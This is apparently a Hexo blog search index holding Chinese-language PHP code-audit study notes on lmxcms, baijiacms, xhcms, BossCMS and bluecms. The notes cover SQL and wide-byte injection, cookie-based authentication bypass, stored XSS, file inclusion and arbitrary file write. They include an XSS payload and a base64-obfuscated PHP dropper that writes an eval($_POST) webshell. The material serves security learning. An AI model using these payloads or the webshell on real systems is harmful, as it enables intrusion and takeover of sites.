<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>MVC&amp;动态调试未授权</title>
    <link href="/2025/05/31/MVC/"/>
    <url>/2025/05/31/MVC/</url>
    
    <content type="html"><![CDATA[<p>php模型开发篇&amp;&amp;MVC层&amp;&amp;未授权</p><span id="more"></span><h3 id="MVC"><a href="#MVC" class="headerlink" title="MVC"></a>MVC</h3><ul><li><h3 id="MVC流程"><a href="#MVC流程" class="headerlink" title="MVC流程"></a>MVC流程</h3><ul><li>Controller截获用户发出的请求；</li><li>Controller调用Model完成状态的读写操作；</li><li>Controller把数据传递给View；</li><li>View渲染最终结果并呈献给用户。</li></ul></li><li><p>MVC各层职能：</p><ol><li>控制器Controller层–负责响应用户请求、准备数据，及决定如何展示数据。</li><li>模块Model层–管理业务逻辑和数据库逻辑。提供连接和操作数据库的抽象层。（过滤也一般写在这里）</li><li>视图View层–负责前端模版渲染数据，通过HTML方式呈现给用户。</li></ol><p><img src="/2025/05/31/MVC/image-20250605200951141-17491257920581.png"></p></li><li><p>MVC对审计主要影响：</p><ol><li>文件代码定位问题，一个功能分别在三个文件里，负责不同的部分</li><li>代码过滤分析问题，一般会写道MODEL层</li><li>前端安全发现问题，模板注入，XSS等</li></ol></li></ul><h3 id="1-文件代码定位"><a href="#1-文件代码定位" class="headerlink" title="1.文件代码定位"></a>1.文件代码定位</h3><p>按原生开发的思路</p><p>url中文件和参数是对应的，但MVC中并不是对应的</p><p><strong>由url定位到文件</strong></p><ol><li><p>定位各层的文件路径：</p><p>从包含文件中找到控制器，模块层所在目录；</p><p><img src="/2025/05/31/MVC/image-20250605194039411-17491257949812.png"></p><p>视图层一般都是html文件</p><p><img src="/2025/05/31/MVC/image-20250605194346733-17491257978763.png"></p></li><li><p>确定网站对应文件及参数</p><p><img src="/2025/05/31/MVC/image-20250605194553283-17491258008954.png"></p></li></ol><p>然后在刚刚确定的MVC各层中找带content的文件即为处理该页面的各层MVC，名字不一定完全相同，找不到带同名的model时，controller文件里可能有相关线索</p><h3 id="2-审计的入口"><a href="#2-审计的入口" class="headerlink" title="2.审计的入口"></a>2.审计的入口</h3><ul><li><p>搜索法：将select封装，这种方法有局限性</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP常见漏洞关键字：<br>SQL注入：<br><br><span class="hljs-selector-tag">select</span> insert update mysql_query mysqli等<br><br>文件上传：<br><br>$_FILES，type=<span class="hljs-string">&quot;file&quot;</span>，上传，<span class="hljs-built_in">move_uploaded_file</span>()等<br><br>XSS跨站：<br><br>print print_r echo sprintf die var_dump var_export等<br><br>文件包含：<br><br>include include_once require require_once等<br><br>代码执行：<br><br>eval assert preg_replace call_user_func call_user_func_array等<br><br>命令执行：<br><br>system exec shell_exec `` passthru pcntl_exec popen proc_open<br><br>变量覆盖：<br><br><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span> <span class="hljs-built_in">parse_str</span>() <span class="hljs-built_in">importrequestvariables</span>() $$ 等<br><br>反序列化：<br><br><span class="hljs-function"><span class="hljs-title">serialize</span><span class="hljs-params">()</span></span> <span class="hljs-built_in">unserialize</span>() __construct __destruct等<br><br>其他漏洞：<br><br><span class="hljs-function"><span class="hljs-title">unlink</span><span class="hljs-params">()</span></span> <span class="hljs-built_in">file_get_contents</span>() <span class="hljs-built_in">show_source</span>() <span class="hljs-built_in">file</span>() <span class="hljs-built_in">fopen</span>()等<br><br>#通用关键字：<br><br>$_GET,$_POST,$_REQUEST,$_FILES,$_SERVER等<br><br><br></code></pre></td></tr></table></figure></li><li><p>功能法：功能点抓包分析</p></li><li><p>对比法：有源码的前后版本，找安全方面是否有改进点</p></li><li><p>漏洞的特征：sql注入(数据库监控) 文件（文件监控）</p></li><li><p>动态调试</p></li><li><p>工具法</p></li></ul><h3 id="3-案例"><a href="#3-案例" class="headerlink" title="3.  案例"></a>3.  <strong>案例</strong></h3><h4 id="3-1-代码执行1"><a href="#3-1-代码执行1" class="headerlink" title="3.1 代码执行1"></a>3.1 代码执行1</h4><blockquote><p>分析顺序：controller–&gt;model–&gt;view</p><p>它是执行写入数据库的代码</p></blockquote><p>CNVD-代码执行lmxcms1.40版本</p><p>1.搜索法  </p><p><img src="/2025/05/31/MVC/image-20250605201607370-17491258047775-174926499178126.png"></p><ol start="2"><li><p>发现变量可控概率高，进行分析</p><p><img src="/2025/05/31/MVC/image-20250605202151207-174926498916725.png"></p><p>查看作用函数caijiDataOne来到model层了</p><p><img src="/2025/05/31/MVC/image-20250605201833736-174926498631124.png"></p><p>数据库执行，与数据库相关的信息cj_data</p><p><img src="/2025/05/31/MVC/image-20250605202655105-174926498331123.png"></p><p>继续oneDB,没啥过滤</p><p><img src="/2025/05/31/MVC/image-20250605201857892-174926498107222.png"></p></li></ol><p>3.触发漏洞</p><p><strong>触发</strong>功能函数showCjData</p><p>即构造url触发</p><p>admin.php?m&#x3D;Acquisi(文件名)&amp;a&#x3D;showCjData(函数)&amp;cid&#x3D;x&amp;id&#x3D;x&amp;lid&#x3D;x(在数据库中查找符合id…值的data)</p><p>4 .注入：<br>后台有一处sql执行，直接写到数据库里面</p><p><img src="/2025/05/31/MVC/image-20250605212456972-174926497808721.png"></p><p><img src="/2025/05/31/MVC/image-20250605212359505-174926497419420.png"></p><p>直接访问就可以出发漏洞执行代码</p><p><img src="/2025/05/31/MVC/image-20250605212604197-174926496966619.png"></p><h4 id="3-2-代码执行2"><a href="#3-2-代码执行2" class="headerlink" title="3.2 代码执行2"></a>3.2 代码执行2</h4><p>模板处容易有rce，前端为了显示一些数据，会需要执行php eval,从数据库中查询到</p><p>smarty模板</p><p><img src="/2025/05/31/MVC/image-20250605214527015.png"></p><h4 id="3-3-文件对比"><a href="#3-3-文件对比" class="headerlink" title="3.3 文件对比"></a>3.3 文件对比</h4><ol><li>快速找到脆弱点，修复的地方上一个版本的问题就在这里</li><li>快速测试新版本有无0day</li><li>UEstudio工具对比文件</li></ol><h4 id="3-4-命令执行"><a href="#3-4-命令执行" class="headerlink" title="3.4 命令执行"></a>3.4 命令执行</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>baijiacms v4-4.1.4</p><p>搜索法搜关键字system(</p><p><img src="/2025/05/31/MVC/image-20250606160504216-174926496563418.png"></p><p>file_save方法的第四个参数</p><p>是由全局变量file接受的</p><p><img src="/2025/05/31/MVC/image-20250606160835226-174926496378617.png"></p><h5 id="操作点"><a href="#操作点" class="headerlink" title="操作点"></a>操作点</h5><p>接下来就要找到能文件上传的点(操作点)</p><p>当前文件地址system&#x2F;weixin&#x2F;class&#x2F;web&#x2F;setting.php，然后就要找对应的url触发</p><p>正确的思路应该先利用已知的url正确分析出来对应的文件位置</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">http://baijiacms:8233/<span class="hljs-keyword">index</span>.php?mod=site<span class="hljs-variable">&amp;act</span>=manager<span class="hljs-variable">&amp;do</span>=store<span class="hljs-variable">&amp;op</span>=<span class="hljs-keyword">display</span><span class="hljs-variable">&amp;beid</span>=1<br></code></pre></td></tr></table></figure><p>它对应的是  <strong>system&#x2F;manager&#x2F;class&#x2F;web&#x2F;store.php</strong></p><p>视图层</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">system<span class="hljs-regexp">/manager/</span>template<span class="hljs-regexp">/web/</span>store_display.php<br></code></pre></td></tr></table></figure><p>然后依照这样构造当前文件(system&#x2F;weixin&#x2F;class&#x2F;web&#x2F;setting.php)的url</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://baijiacm<span class="hljs-variable">s:8233</span>/<span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">mod</span>=site&amp;act=weixin&amp;<span class="hljs-keyword">do</span>=setting<br></code></pre></td></tr></table></figure><h5 id="顺利触发危险方法及漏洞"><a href="#顺利触发危险方法及漏洞" class="headerlink" title="顺利触发危险方法及漏洞"></a>顺利触发危险方法及漏洞</h5><blockquote><p>构造一些条件使得漏洞能够顺利触发</p></blockquote><p>1.顺利调用方法需要满足两个if</p><p><img src="/2025/05/31/MVC/image-20250606174402313-174926495955516.png"></p><p>2.在危险方法里面需要满足$settings[‘image_compress_openscale’]不为空</p><p><img src="/2025/05/31/MVC/image-20250606195751067-174926495702515.png"></p><p>找到对应功能的表单名称相同</p><p><img src="/2025/05/31/MVC/image-20250606200359814-174926495427114.png"></p><p>所以同理找到表单名为image_compress_openscale的</p><p>先在代码中找找前端页面和线索</p><p>文件路径：system&#x2F;manager&#x2F;template&#x2F;web&#x2F;netattach.php</p><p>对应url:   &#x2F;index.php?mod&#x3D;site&amp;act&#x3D;manager&amp;do&#x3D;netattach</p><p><img src="/2025/05/31/MVC/image-20250606201216936-174926495220113.png"></p><p>成功找到，使得它的值不为空，要确保它是开启的</p><p><img src="/2025/05/31/MVC/image-20250606202014141-174926494355012.png"></p><p>抓包修改filename为命令，&amp;&amp;目的为截断路径来执行命令</p><p><img src="/2025/05/31/MVC/image-20250606203307658-174926494188411.png"></p><h3 id="动态调试未授权"><a href="#动态调试未授权" class="headerlink" title="动态调试未授权"></a>动态调试未授权</h3><h4 id="1-未授权安全挖掘问题"><a href="#1-未授权安全挖掘问题" class="headerlink" title="1. 未授权安全挖掘问题"></a>1. 未授权安全挖掘问题</h4><ol><li><p>找鉴 权看引用-未引用鉴权逻辑 （没有鉴权）</p></li><li><p>找鉴权看脆弱-脆弱的鉴权逻辑（鉴权逻辑可绕过）</p></li><li><p>找鉴权看逻辑-不严谨的鉴权逻辑</p><ul><li><p>先功能操作后验证鉴权（逻辑错误）</p></li><li><p>先验证鉴权了，但是没有及时跳出程序导致执行了后续功能操作</p></li></ul></li></ol><h4 id="2-熊海cms"><a href="#2-熊海cms" class="headerlink" title="2. 熊海cms"></a>2. 熊海cms</h4><h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><blockquote><p>后台逻辑脆弱鉴权</p></blockquote><p>先找鉴权文件</p><p>简单的源码：checkadmin,checklogin</p><p>该案例先登陆进来观察逻辑</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xhcms:<span class="hljs-number">8332</span><span class="hljs-regexp">/admin/</span>?r=newwz<br></code></pre></td></tr></table></figure><p>参数r控制的是访问的后台文件</p><p><img src="/2025/05/31/MVC/image-20250607095849272-174926493215310.png"></p><p>访客模式访问该url会跳转到登陆页面，说明该文件是有鉴权的</p><p>很显然包含的checklogin就是鉴权文件</p><p><img src="/2025/05/31/MVC/image-20250607100051267-17492649299849.png"></p><p>脆弱验证，cookie不为空即可绕过</p><p><img src="/2025/05/31/MVC/image-20250607100209868-17492649273848.png"></p><h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>phpstorm+phpstudy+x-debug(插件)</p><p>$user只要不为空，就不会跳转到登陆界面</p><p><img src="/2025/05/31/MVC/image-20250607105119747-174926721941227.png"></p><p>未登录状态下，将coookie中添加uesr值，即可绕过鉴权</p><p><img src="/2025/05/31/MVC/image-20250607110136586-174926722727128.png"></p><p><img src="/2025/05/31/MVC/image-20250607110244097-174926722906429.png"></p><h4 id="3-创文cms"><a href="#3-创文cms" class="headerlink" title="3. 创文cms"></a>3. 创文cms</h4><h5 id="未引用"><a href="#未引用" class="headerlink" title="未引用"></a>未引用</h5><blockquote><p>思路一：找鉴权文件</p></blockquote><p>找到鉴权文件admin.php,session验证，并且我们数据包是无法干扰的，所以思路就是找遗漏的，为引用admin.php的文件</p><p><img src="/2025/05/31/MVC/image-20250607113334905.png"></p><p>查看到一些信息</p><p><img src="/2025/05/31/MVC/image-20250607114156634.png"></p><blockquote><p>思路二   从功能点代码处入手，判断未授权</p></blockquote><p>未登录状态下，在功能点代码处下断点，能执行到断点处就存在鉴权问题，没断说明鉴权了</p><h4 id="4-BossCMS"><a href="#4-BossCMS" class="headerlink" title="4. BossCMS"></a>4. BossCMS</h4><p><a href="https://gitee.com/Greenpeas/BOSSCMS/repository/archive/master.zip">下载仓库 · 荷兰豆&#x2F;BOSSCMS-Free建站系统 - Gitee.com</a></p><blockquote><p>任意文件删除（未授权）</p></blockquote><p>它是MVC的</p><p>1.找出鉴权文件：定位首页文件分析，admin为鉴权</p><p><img src="/2025/05/31/MVC/image-20250607155849655-174928864136831.png"></p><p>2.寻找未引用及鉴权漏洞</p><p>3.寻找脆弱逻辑或不严谨的逻辑</p><p>这里就是不严谨的逻辑，重定向之后并没有退出</p><p><img src="/2025/05/31/MVC/image-20250607162204520-174928863957730.png"></p><ol start="4"><li></li></ol><p>所以在未登陆的状态下，post访问删除文件的url是可以成功执行删除的</p><h4 id="5-泛微-eoffice-v9-0"><a href="#5-泛微-eoffice-v9-0" class="headerlink" title="5. 泛微-eoffice v9.0"></a>5. 泛微-eoffice v9.0</h4><p><strong>思路：</strong></p><p>0day:搜文件上传关键字，通过分析无需登录触发它</p><p>1day:补丁源码对比找到差异</p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>bluecms审计</title>
    <link href="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<p>php代码审计</p><span id="more"></span><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><ul><li>原生态开发</li><li>框架类开发</li><li>组件类开发</li><li>前端类开发</li></ul><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526081637820-17482186027571.png"></p><h1 id="原生开发-SQL注入"><a href="#原生开发-SQL注入" class="headerlink" title="原生开发-SQL注入"></a>原生开发-SQL注入</h1><h2 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h2><h3 id="一环境："><a href="#一环境：" class="headerlink" title="一环境："></a>一环境：</h3><ul><li><p><a href="https://github.com/source-trace/bluecms%EF%BC%8C%E6%94%BE%E5%9C%A8%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B">https://github.com/source-trace/bluecms，放在根目录下</a></p></li><li><p>访问install目录出现空白页面，phpstudy设置允许目录访问，再删除install&#x2F;compile目录下的php文件，再次访问即可安装成功（这里存在重新安装的漏洞，再访问install目录是可以重新配置数据库的）</p></li><li><p>继续数据库的配置，之后重新访问首页文件</p></li></ul><hr><h3 id="二-漏洞："><a href="#二-漏洞：" class="headerlink" title="二.漏洞："></a>二.漏洞：</h3><p><strong>如何快速在多个文件代码里面找脆弱：</strong></p><ol><li>看文件路径</li><li>看代码里面的变量</li><li>看变量前后的过滤</li></ol><h4 id="2-1-sql注入漏洞"><a href="#2-1-sql注入漏洞" class="headerlink" title="2.1 sql注入漏洞"></a>2.1 sql注入漏洞</h4><p><strong>正则搜索：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">update</span><span class="hljs-operator">|</span><span class="hljs-keyword">select</span><span class="hljs-operator">|</span><span class="hljs-keyword">insert</span><span class="hljs-operator">|</span><span class="hljs-keyword">delete</span><span class="hljs-operator">|</span>).<span class="hljs-operator">*</span>?where.<span class="hljs-operator">*</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526134101728-17482380639762.png"></p><h5 id="参数过滤"><a href="#参数过滤" class="headerlink" title="参数过滤"></a>参数过滤</h5><ul><li>trim过滤空格，这里相当于变量$ad_id没过滤</li></ul><p><strong>单拿出来sql语句：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ad</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">getone</span>(<span class="hljs-string">&quot;SELECT * FROM &quot;</span>.<span class="hljs-title function_ invoke__">table</span>(<span class="hljs-string">&#x27;ad&#x27;</span>).<span class="hljs-string">&quot; WHERE ad_id =&quot;</span>.<span class="hljs-variable">$ad_id</span>);<br></code></pre></td></tr></table></figure><p>自定义函数getone,查找声明和用例，发现它本质上还是原生的执行sql语句的代码，然后它也没有进行过滤的操作</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526135209658.png" alt="image-20250526135209658"></p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526135227596.png" alt="image-20250526135227596"></p><p>在页面中输出结果是以html的形式出现的，结果是在源码中</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526193812710-17482594958513.png" alt="image-20250526193812710"></p><p>就开始测(确定列数，回显位，用报错注入，布尔时间盲注啥的)</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526193919343-17482595613304-17482605500765.png"></p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526195835630-17482607169246.png" alt="image-20250526195835630"></p><p>发现它对引号转义了</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526195906654.png" alt="image-20250526195906654"></p><h6 id="源码分析引号转义-common-inc-php-："><a href="#源码分析引号转义-common-inc-php-：" class="headerlink" title="源码分析引号转义(common.inc.php)："></a>源码分析引号转义(common.inc.php)：</h6><p>在ad_js.php文件中发现还包含了文件common.inc.php，猜到是这个文件中做的转义</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526200517241-17482627367789.png"></p><ul><li><p>在blueCMS首页文件index.php中发现首页首先会加载common.inc.php，include&#x2F;index.fun.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;IN_BLUE&quot;</span>,<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;include/common.inc.php&#x27;</span>);<span class="hljs-comment">//require_once函数是同一个文件加载一次</span><br><span class="hljs-keyword">require_once</span>(BLUE_ROOT.<span class="hljs-string">&#x27;include/index.fun.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>所以他是一个多入口的模式，注意多入口的系统需要对每个入口文件单独做安全过滤，它们通常都会加载同一个文件来实现，<strong>在BlueCMS中这个文件就是common.inc.php</strong></p></li></ul><p>继续跟进去函数deep_addslashes</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526201729575-174826972257014.png"></p><p>发现最后就是用的函数addslashes对参数进行过滤</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526201830391-17482619888368.png"></p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526201945214-174832965482820.png"></p><h4 id="2-2-宽字节注入"><a href="#2-2-宽字节注入" class="headerlink" title="2.2 宽字节注入"></a>2.2 宽字节注入</h4><p>common.inc.php文件中加载了数据连接文件mysql.class.php</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526204437880-174826347942110.png"></p><p>数据库连接里面发现编码是gbk,那就有宽字节注入的可能</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526203950281.png" alt="image-20250526203950281"></p><p>发下后台登陆，验证账号密码的是函数check_admin</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526210358972.png"></p><p>参数有单引号闭合，前面也分析了getone没进行过滤，login.php同样加载了过滤文件common.inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/include/common.inc.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526210610430.png"></p><p>所以可以宽字节注入用管理员的身份登录</p><ul><li>要注意直接在浏览器上回被编码，应该抓包后在bp中改</li></ul><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526220559025-174826836050511.png"></p><h4 id="2-3-存储型XSS"><a href="#2-3-存储型XSS" class="headerlink" title="2.3 存储型XSS"></a>2.3 存储型XSS</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>content进行filter_data过滤</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526221509925.png"></p><p>跟进函数，只过滤了这几种，可以用<img>标签绕过</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526221631599.png" alt="image-20250526221631599"></p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>抓包，写入xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xss">&lt;img src=&quot;&quot; onerror=&quot;alert(123456)&quot;&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526222535737-174826953730412.png"></p><p>访问news.php目录</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250526222504024-174826955305313.png"></p><h4 id="2-4-文件包含"><a href="#2-4-文件包含" class="headerlink" title="2.4  文件包含"></a>2.4  文件包含</h4><h5 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h5><p>这里 pay参数无过滤，后面直接拼接index.php,有截断的可能，然后网站功能点是支付</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527102859591.png"></p><p>相对路径是相对include&#x2F;payment的！！！！！</p><ul><li><p>这里注意：</p><ul><li><p>绕过方法1：%00 截断</p><ul><li>条件：magic_quotes_gpc &#x3D; Off，PHP版本&lt;5.3.4</li></ul></li><li><p>绕过方法2：路径长度截断</p><ul><li>条件：windows 下目录路径最大长度为256字节，超出部分将丢弃；linux 下目录最大长度为4096字节，超出长度将丢弃；PHP版本&lt;5.2.8</li></ul></li></ul></li></ul><p>我这里phpstudy不知道怎么的，安装不了5.2版本的，没有进行复现成功，学习一下思路</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527113541752-174831694303216.png"></p><h5 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h5><p>上面包含本地php文件截断成功的话，可以再利用文件上传漏洞点getshell</p><ul><li>寻找一个可以上传点，上传一个带木马的jpg文件，利用文件包含漏洞包含jpg文件，拿shell。</li></ul><p>在上传头像的功能点处上传一句话</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527114351140-174832873982119.png"></p><p>返回文件上传的路径</p><p>data&#x2F;upload&#x2F;face_pic&#x2F;17483177255.jpg</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527114911196-174831775565417.png"></p><p>之后再用文件包含就好了</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527145124924-174832868633018.png"></p><p>还有一种思路，上传写这个代码的jpg，文件包含执行该代码，会在根目录下生成lost.php的马，内容为<code>&lt;?php @eval($_POST[&#39;lostwolf&#39;]);?&gt;</code> 菜刀连接拿shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;bG9zdC5waHA=&#x27;</span>),w),<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg==&#x27;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-5-任意文件读取写入"><a href="#2-5-任意文件读取写入" class="headerlink" title="2.5 任意文件读取写入"></a>2.5 任意文件读取写入</h4><p>功能点：后台编辑功能</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527155642611-174833260427621.png"></p><h5 id="分析源码-1"><a href="#分析源码-1" class="headerlink" title="分析源码"></a>分析源码</h5><p>可控参数$act,它用于选择操作，具体操作有list, edit 和do_edit</p><p>(list，列出指定目录下的文件</p><p>操作 edit用于读取指定目录下的$file，该参数可控，通过..&#x2F;可以实现目录穿越，这里就有任意文件读取漏洞</p><p>操作 do_edit 将$tpl_content写入到$tpl_name文件中，两个参数都可控)</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527155936009-174833277780722.png"></p><p>edit操作中可疑参数$tql_name  他没有进行任处理就直接拼接</p><p>可能会有目录遍历访问任意文件的漏洞</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527170748155.png"></p><p>do_edit操作中post接受的可疑参数$tpl_content进行了deep_stripslahes操作</p><p>$tpl_content后续还带入写入操作中</p><p>且$tpl_name还是过滤空格简单处理了，可以创建新的php文件</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527171931482-174833757254030.png"></p><p>查看操作函数deep_addslashes，将参数进行stripslashes操作</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527160503473-174833310489623.png"></p><p><strong><code>stripslashes()</code> 函数删除由 <code>addslashes()</code> 函数添加的反斜杠。</strong>（上面也分析了common.inc.php过滤文件对post接收的数据进行了过滤）</p><p><strong>所以现在这里的content就完全可控了，存在任意写入的漏洞</strong></p><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p>1 .$tql_name    </p><p>利用目录穿越读取任意文件</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527164246915-174833536821625.png"></p><p>2 .$tql_content</p><p>任意文件写入，注意是post方式接受的</p><p>抓包修改数据包,注意操作是do_edit了</p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527171203128-174833712490728.png"></p><p><img src="/2025/05/29/bluecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20250527172220603-174833774182431.png"></p><p>参考文章</p><p><a href="https://www.freebuf.com/articles/web/284008.html">https://www.freebuf.com/articles/web/284008.html</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">https://www.cnblogs.com/wkzb/p/12732078.html</a></p><p><a href="https://www.freebuf.com/vuls/196190.html">https://www.freebuf.com/vuls/196190.html</a></p><p><a href="https://www.cnblogs.com/zjhzjhhh/p/14338775.html">https://www.cnblogs.com/zjhzjhhh/p/14338775.html</a></p>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>emlogcms审计</title>
    <link href="/2025/05/29/Emlog%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
